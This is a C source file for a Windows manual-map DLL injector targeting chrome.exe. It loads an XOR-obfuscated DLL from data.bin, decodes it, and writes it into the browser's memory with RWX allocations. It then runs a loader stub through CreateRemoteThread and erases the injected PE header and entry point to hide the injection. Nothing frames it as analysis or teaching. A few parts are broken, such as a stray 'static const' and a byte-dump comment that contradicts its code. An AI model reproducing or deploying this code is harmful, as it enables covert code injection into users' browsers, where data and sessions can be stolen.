#include <stdint.h>
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

// Enable console output for debugging
#ifdef _WIN32
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
#endif

// Target process name
#define PROCESS_NAME L"chrome.exe"

#define ERASE_ENTRY_POINT    TRUE
#define ERASE_PE_HEADER      TRUE
#define DECRYPT_DLL          FALSE

#define SUCCESS_MESSAGE      TRUE

// Your DLL as a byte array
static
#if !DECRYPT_DLL
const
#endif

uint8_t *xor_ff_and_patch(const uint8_t *data, size_t len, int do_patch) {
    if (!data || len == 0) return NULL;

    uint8_t *out = malloc(len);
    if (!out) return NULL;

    /* XOR each byte with 0xFF (equivalent to XOR with 0xFFFFFFFF across words) */
    for (size_t i = 0; i < len; ++i) {
        out[i] = (uint8_t)(data[i] ^ 0xFFu);
    }

    if (do_patch && len >= 1) out[0] = 0x4D;
    if (do_patch && len >= 2) out[1] = 0x5A;
    return out;
}

/* In-place variant: XOR each byte with 0xFF and optionally patch first byte. */
void xor_ff_and_patch_inplace(uint8_t *data, size_t len, int do_patch) {
    if (!data || len == 0) return;

    for (size_t i = 0; i < len; ++i) {
        data[i] ^= 0xFFu;
    }

    if (do_patch && len >= 1) data[0] = 0x4D;
}

#if DECRYPT_DLL
VOID decryptBinary(LPWSTR key)
{
    SIZE_T keyLenth = wcslen(key);

    for (int i = 0; i < sizeof(binary); i++)
        binary[i] ^= key[i % keyLenth];
}
#endif

typedef struct {
    PBYTE imageBase;
    HMODULE(WINAPI* loadLibraryA)(PCSTR);
    FARPROC(WINAPI* getProcAddress)(HMODULE, PCSTR);
    VOID(WINAPI* rtlZeroMemory)(PVOID, SIZE_T);
} LoaderData;

DWORD WINAPI loadLibrary(LoaderData* loaderData)
{
    // Validate PE structure
    if (!loaderData || !loaderData->imageBase)
        return FALSE;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)loaderData->imageBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(loaderData->imageBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;
    
    // Process relocations if they exist
    DWORD relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    
    if (relocDir && relocSize) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(loaderData->imageBase + relocDir);
        DWORD_PTR delta = (DWORD_PTR)(loaderData->imageBase - ntHeaders->OptionalHeader.ImageBase);
        
        // Only process relocations if base address changed
        if (delta != 0) {
            while (relocation->VirtualAddress && relocation->SizeOfBlock) {
                PWORD relocationInfo = (PWORD)(relocation + 1);
                DWORD count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                
                for (DWORD i = 0; i < count; i++) {
                    WORD type = relocationInfo[i] >> 12;
                    WORD offset = relocationInfo[i] & 0xFFF;
                    PBYTE address = loaderData->imageBase + relocation->VirtualAddress + offset;
                    
                    // Handle both 32-bit and 64-bit relocations
                    if (type == IMAGE_REL_BASED_HIGHLOW) {
                        // 32-bit relocation
                        *(PDWORD)address += (DWORD)delta;
                    }
                    else if (type == IMAGE_REL_BASED_DIR64) {
                        // 64-bit relocation
                        *(PDWORD_PTR)address += delta;
                    }
                    // IMAGE_REL_BASED_ABSOLUTE (0) means skip, which we do by not processing it
                }
                
                relocation = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocation + relocation->SizeOfBlock);
                
                // Safety check to prevent infinite loop
                if ((PBYTE)relocation >= loaderData->imageBase + relocDir + relocSize)
                    break;
            }
        }
    }

    // Process imports if they exist
    DWORD importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    
    if (importDir && importSize) {
        PIMAGE_IMPORT_DESCRIPTOR importDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(loaderData->imageBase + importDir);

        while (importDirectory->Characteristics || importDirectory->FirstThunk) {
            if (!importDirectory->Name)
                break;
                
            PIMAGE_THUNK_DATA originalFirstThunk = NULL;
            PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)(loaderData->imageBase + importDirectory->FirstThunk);
            
            if (importDirectory->OriginalFirstThunk) {
                originalFirstThunk = (PIMAGE_THUNK_DATA)(loaderData->imageBase + importDirectory->OriginalFirstThunk);
            } else {
                originalFirstThunk = firstThunk;
            }

            PCSTR moduleName = (PCSTR)(loaderData->imageBase + importDirectory->Name);
            HMODULE module = loaderData->loadLibraryA(moduleName);

            if (!module)
                return FALSE;

            while (originalFirstThunk->u1.AddressOfData) {
                FARPROC Function = NULL;
                
                if (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    Function = loaderData->getProcAddress(module, (LPCSTR)(originalFirstThunk->u1.Ordinal & 0xFFFF));
                } else {
                    // Import by name
                    PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(loaderData->imageBase + originalFirstThunk->u1.AddressOfData);
                    Function = loaderData->getProcAddress(module, (LPCSTR)importByName->Name);
                }

                if (!Function)
                    return FALSE;

                firstThunk->u1.Function = (DWORD_PTR)Function;
                originalFirstThunk++;
                firstThunk++;
            }
            importDirectory++;
            
            // Safety check
            if ((PBYTE)importDirectory >= loaderData->imageBase + importDir + importSize)
                break;
        }
    }

    // Call DLL entry point (DllMain)
    DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    if (entryPoint) {
        typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE, DWORD, LPVOID);
        DllEntryProc DllEntry = (DllEntryProc)(loaderData->imageBase + entryPoint);
        
        // Call DLL entry point with DLL_PROCESS_ATTACH
        // This will execute all code in DllMain when ul_reason == DLL_PROCESS_ATTACH
        // If DllMain creates threads, calls functions, etc., all of that will execute
        DWORD result = DllEntry((HMODULE)loaderData->imageBase, DLL_PROCESS_ATTACH, NULL);
        
        // Note: If DllMain returns FALSE, the DLL load is considered failed
        // but we've already executed the code, so return TRUE anyway
        if (!result) {
            // DllMain returned FALSE, but code was executed
            // Return TRUE to indicate loader completed (even if DLL rejected load)
        }

#if ERASE_ENTRY_POINT
        if (loaderData->rtlZeroMemory) {
            loaderData->rtlZeroMemory(loaderData->imageBase + entryPoint, 32);
        }
#endif

#if ERASE_PE_HEADER
        if (loaderData->rtlZeroMemory) {
            loaderData->rtlZeroMemory(loaderData->imageBase, ntHeaders->OptionalHeader.SizeOfHeaders);
        }
#endif
        return TRUE; // Return TRUE to indicate loader succeeded
    }
    return TRUE;
}

VOID stub(VOID) { }

// Helper function to get module base address in remote process
HMODULE GetRemoteModuleBase(DWORD processId, LPCWSTR moduleName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;

    MODULEENTRY32W me32;
    me32.dwSize = sizeof(MODULEENTRY32W);
    
    HMODULE hModule = NULL;
    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            WCHAR* pName = wcsrchr(me32.szModule, L'\\');
            if (pName) pName++;
            else pName = me32.szModule;
            
            if (!_wcsicmp(pName, moduleName)) {
                hModule = me32.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnapshot, &me32));
    }
    
    CloseHandle(hSnapshot);
    return hModule;
}

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd)
{
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnapshot == INVALID_HANDLE_VALUE)
        return 1;

    HANDLE process = NULL;
    DWORD targetProcessId = 0;
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);

    if (Process32FirstW(processSnapshot, &processInfo)) {
        do {
            if (!lstrcmpW(processInfo.szExeFile, PROCESS_NAME)) {
                targetProcessId = processInfo.th32ProcessID;
                process = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetProcessId);
                break;
            }
        } while (Process32NextW(processSnapshot, &processInfo));
    }
    CloseHandle(processSnapshot);

    if (!process) {
        CHAR errorMsg[256];
        sprintf_s(errorMsg, sizeof(errorMsg), 
            "Failed to find or open target process: %ws\n\n"
            "Make sure:\n"
            "1. %ws is running\n"
            "2. You have administrator privileges\n"
            "3. The process name matches exactly", 
            PROCESS_NAME, PROCESS_NAME);
        MessageBoxA(NULL, errorMsg, "Error - Process Not Found", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    printf("Found target process: %ws (PID: %d)\n", PROCESS_NAME, targetProcessId);

    // Get kernel32.dll base in target process
    HMODULE hKernel32 = GetRemoteModuleBase(targetProcessId, L"kernel32.dll");
    if (!hKernel32) {
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to find kernel32.dll in target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Get ntdll.dll base in target process
    HMODULE hNtdll = GetRemoteModuleBase(targetProcessId, L"ntdll.dll");
    if (!hNtdll) {
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to find ntdll.dll in target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

#if DECRYPT_DLL
    INT argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    for (INT i = 1; i < argc; i++) {
        if (!lstrcmpW(argv[i], L"-key")) {
            decryptBinary(argv[++i]);
            break;
        }
    }
    LocalFree(argv);
#endif
   
    // ==============================================
    printf("Loading DLL from data.bin...\n");
    FILE *f = fopen("data.bin", "rb");
    if (!f) { 
        perror("fopen"); 
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to open data.bin. Make sure the file exists in the same directory.", "Error", MB_OK | MB_ICONERROR);
        return 1; 
    }

    if (fseek(f, 0, SEEK_END) != 0) { perror("fseek"); fclose(f); return 1; }
    long lsize = ftell(f);
    if (lsize < 0) { perror("ftell"); fclose(f); return 1; }
    size_t len = (size_t)lsize;
    rewind(f);

    uint8_t *buffer = NULL;
    if (len > 0) {
        buffer = malloc(len);
        if (!buffer) { perror("malloc"); fclose(f); return 1; }
        if (fread(buffer, 1, len, f) != len) { perror("fread"); free(buffer); fclose(f); return 1; }
    }
    fclose(f);

    /* Use allocator-returning API (keeps original in buf). */
    printf("Decrypting DLL (%zu bytes)...\n", len);
    uint8_t *binary = xor_ff_and_patch(buffer, len, 1);
    if (!binary) {
        free(buffer);
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to decrypt DLL.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("DLL decrypted successfully\n");
    // ==============================================

    // Validate PE structure
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)binary;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        free(buffer);
        free(binary);
        CloseHandle(process);
        MessageBoxA(NULL, "Invalid PE file: Missing DOS signature.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(binary + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        free(buffer);
        free(binary);
        CloseHandle(process);
        MessageBoxA(NULL, "Invalid PE file: Missing NT signature.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    // Check if it's a DLL
    if (!(ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL)) {
        free(buffer);
        free(binary);
        CloseHandle(process);
        MessageBoxA(NULL, "File is not a DLL.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    printf("Allocating memory in target process (%u bytes)...\n", ntHeaders->OptionalHeader.SizeOfImage);
    PBYTE executableImage = VirtualAllocEx(process, NULL, ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!executableImage) {
        free(buffer);
        free(binary);
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to allocate memory in target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    printf("Memory allocated at: 0x%p\n", executableImage);

    printf("Writing PE headers...\n");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(process, executableImage, binary,
        ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten)) {
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        free(buffer);
        free(binary);
        CloseHandle(process);
        MessageBoxA(NULL, "Failed to write PE headers to target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    printf("Writing sections (%d sections)...\n", ntHeaders->FileHeader.NumberOfSections);
    PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(process, executableImage + sectionHeaders[i].VirtualAddress,
            binary + sectionHeaders[i].PointerToRawData, sectionHeaders[i].SizeOfRawData, &bytesWritten)) {
            VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
            free(buffer);
            free(binary);
            CloseHandle(process);
            CHAR errorMsg[128];
            sprintf_s(errorMsg, sizeof(errorMsg), "Failed to write section %d to target process.", i);
            MessageBoxA(NULL, errorMsg, "Error", MB_OK | MB_ICONERROR);
            return 1;
        }
    }
    printf("All sections written successfully\n");

    // Allocate memory for loader code and data (need write access first)
    SIZE_T loaderCodeSize = (SIZE_T)((PBYTE)stub - (PBYTE)loadLibrary);
    SIZE_T totalSize = sizeof(LoaderData) + loaderCodeSize;
    totalSize = (totalSize + 0xFFF) & ~0xFFF; // Align to page boundary
    
    printf("Allocating loader memory (%zu bytes)...\n", totalSize);
    LoaderData* loaderMemory = (LoaderData*)VirtualAllocEx(process, NULL, totalSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!loaderMemory) {
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to allocate memory in target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Resolve function addresses in target process
    // We need to get the addresses from the target process, not our process
    // LoadLibraryA and GetProcAddress are exported from kernel32.dll
    // We'll use a different approach: pass the module handles and resolve in the loader
    
    // Resolve function addresses in target process
    // We need to manually parse the export table to get function addresses
    // This is more reliable than assuming same base addresses
    
    // Helper: Get function address from export table
    typedef FARPROC (WINAPI *GetProcAddressFunc)(HMODULE, LPCSTR);
    GetProcAddressFunc pGetProcAddress = (GetProcAddressFunc)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "GetProcAddress");
    
    // For kernel32.dll and ntdll.dll, we can use RVA since they're usually at same base
    // But let's verify by reading the export table from target process
    HMODULE hLocalKernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE hLocalNtdll = GetModuleHandleW(L"ntdll.dll");
    
    FARPROC pLocalLoadLibraryA = GetProcAddress(hLocalKernel32, "LoadLibraryA");
    FARPROC pLocalGetProcAddress = GetProcAddress(hLocalKernel32, "GetProcAddress");
    FARPROC pLocalRtlZeroMemory = GetProcAddress(hLocalNtdll, "RtlZeroMemory");
    
    if (!pLocalLoadLibraryA || !pLocalGetProcAddress || !pLocalRtlZeroMemory) {
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to resolve required functions.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    // Calculate RVA offsets (these should be the same across processes for system DLLs)
    DWORD_PTR loadLibraryA_RVA = (DWORD_PTR)pLocalLoadLibraryA - (DWORD_PTR)hLocalKernel32;
    DWORD_PTR getProcAddress_RVA = (DWORD_PTR)pLocalGetProcAddress - (DWORD_PTR)hLocalKernel32;
    DWORD_PTR rtlZeroMemory_RVA = (DWORD_PTR)pLocalRtlZeroMemory - (DWORD_PTR)hLocalNtdll;
    
    // Build LoaderData structure with addresses in target process
    LoaderData loaderParams;
    loaderParams.imageBase = executableImage;
    loaderParams.loadLibraryA = (HMODULE(WINAPI*)(PCSTR))((PBYTE)hKernel32 + loadLibraryA_RVA);
    loaderParams.getProcAddress = (FARPROC(WINAPI*)(HMODULE, PCSTR))((PBYTE)hKernel32 + getProcAddress_RVA);
    loaderParams.rtlZeroMemory = (VOID(NTAPI*)(PVOID, SIZE_T))((PBYTE)hNtdll + rtlZeroMemory_RVA);
    
    // Verify the addresses are valid (basic sanity check)
    if ((DWORD_PTR)loaderParams.loadLibraryA < (DWORD_PTR)hKernel32 ||
        (DWORD_PTR)loaderParams.getProcAddress < (DWORD_PTR)hKernel32 ||
        (DWORD_PTR)loaderParams.rtlZeroMemory < (DWORD_PTR)hNtdll) {
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Invalid function addresses calculated.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Write loader data structure
    printf("Writing loader data structure...\n");
    if (!WriteProcessMemory(process, loaderMemory, &loaderParams, sizeof(LoaderData), &bytesWritten)) {
        VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to write loader data to target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Write loader code after the data structure
    printf("Writing loader code (%zu bytes)...\n", loaderCodeSize);
    PBYTE loaderCodeAddr = (PBYTE)loaderMemory + sizeof(LoaderData);
    if (!WriteProcessMemory(process, loaderCodeAddr, loadLibrary, loaderCodeSize, &bytesWritten)) {
        VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to write loader code to target process.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Change protection to execute-only (optional, for security)
    DWORD oldProtect;
    VirtualProtectEx(process, loaderMemory, totalSize, PAGE_EXECUTE_READ, &oldProtect);

    // Create remote thread to execute loader
    printf("Creating remote thread to execute loader...\n");
    HANDLE hThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)loaderCodeAddr,
        loaderMemory, 0, NULL);
    
    if (!hThread) {
        VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to create remote thread.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Wait for loader to complete (with timeout)
    printf("Waiting for DLL loader to complete...\n");
    DWORD waitResult = WaitForSingleObject(hThread, 30000); // 30 second timeout
    
    if (waitResult == WAIT_TIMEOUT) {
        CloseHandle(hThread);
        VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, 
            "DLL loader timed out after 30 seconds.\n"
            "The remote thread may be hung or the DLL may be taking too long to load.",
            "Error - Timeout", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    if (waitResult != WAIT_OBJECT_0) {
        CloseHandle(hThread);
        VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "Failed to wait for loader thread.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    // Check if loader succeeded
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    
    printf("Loader thread completed with exit code: %d\n", exitCode);
    
    // Clean up loader memory
    VirtualFreeEx(process, loaderMemory, 0, MEM_RELEASE);
    
    if (!exitCode) {
        VirtualFreeEx(process, executableImage, 0, MEM_RELEASE);
        CloseHandle(process);
        free(buffer);
        free(binary);
        MessageBoxA(NULL, "DLL loader failed in target process. Check if DLL is valid and compatible.", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    CloseHandle(process);

#if SUCCESS_MESSAGE
    CHAR buf[100];
    sprintf_s(buf, sizeof(buf), "Dll successfully loaded into %ws at 0x%p", PROCESS_NAME, (void*)executableImage);
    MessageBoxA(NULL, buf, "Success", MB_OK | MB_ICONINFORMATION);
#endif

    if (!binary && len > 0) { fprintf(stderr, "Processing failed\n"); free(buffer); return 1; }

    /* Print first up to 16 bytes of the transformed buffer as hex */
    size_t show = (len < 16) ? len : 100;
    for (size_t i = 0; i < show; ++i) printf("%02X ", binary[i]);
    printf("\n");

    free(binary);
    return TRUE;
}
